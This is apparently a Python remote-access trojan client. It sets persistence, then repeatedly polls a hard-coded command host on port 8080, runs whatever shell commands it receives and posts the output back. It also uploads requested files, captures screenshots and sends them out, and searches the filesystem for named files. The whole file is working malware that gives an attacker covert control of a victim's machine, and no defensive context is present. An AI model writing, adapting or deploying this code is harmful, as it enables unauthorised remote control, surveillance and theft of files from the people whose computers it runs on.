import requests
import time
import subprocess
import os
import tempfile
import shutil
from persistence import set_persistence
from PIL import ImageGrab

#HOST = '10.10.10.100'
HOST = '192.168.1.97'
PORT = 8080

def main():
    set_persistence()

    url = 'http://{host}:{port}'.format(host=HOST, port=PORT)

    while True:
        try:
            req = requests.get(url)
        except requests.exceptions.ConnectionError:
            time.sleep(3)
            continue

        cmd = req.text

        if cmd in ('exit', 'shutdown'):
            requests.post(url, data='Client is shutting down')
            break
        elif 'grab*' in cmd:
            filename = cmd.split('*')[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    files = {filename: f}
                    requests.post(url + '/store', files=files)
            else:
                requests.post(url, data='[!] There was an error sending the file {filename}'.format(filename=filename))
        elif cmd.startswith('cd '):
            try:
                _, _, dir = cmd.partition(' ')
                os.chdir(dir)
                full_path = os.getcwd()
                requests.post(url + '/cwd', data='Changed dir to {}'.format(full_path))
            except Exception as e:
                requests.post(url, data='[!] There was an error setting directory\n{}'.format(e))
        elif 'screencap' in cmd:
            temp_dir = tempfile.mkdtemp()
            filename = os.path.join(temp_dir, 'img.jpg')

            ImageGrab.grab().save(filename, 'JPEG')
            files = {'file': open(filename, 'rb')}
            requests.post(url + '/store', files=files)
            files['file'].close()

            shutil.rmtree(temp_dir)
        elif 'search' in cmd:
            cmd = cmd[7:].strip()
            path = os.path.dirname(cmd) or os.getcwd()
            basename = os.path.basename(cmd)

            results = []
            for dirpath, dirname, files in os.walk(path):
                for file in files:
                    if basename.startswith('*'):
                        if file.endswith(os.path.splitext(basename)[1]):
                            results.append(os.path.join(dirpath, file))
                    else:
                        if file == basename:
                            results.append(os.path.join(dirpath, file))

            data = '\n'.join(results)
            requests.post(url, data=data)

        else:
            popen = subprocess.Popen(cmd,
                                     shell=True,
                                     stderr=subprocess.STDOUT,
                                     stdout=subprocess.PIPE)
            requests.post(url, data=popen.stdout.read() or '*** No Output ***')

        time.sleep(3)

if __name__ == '__main__':
    main()
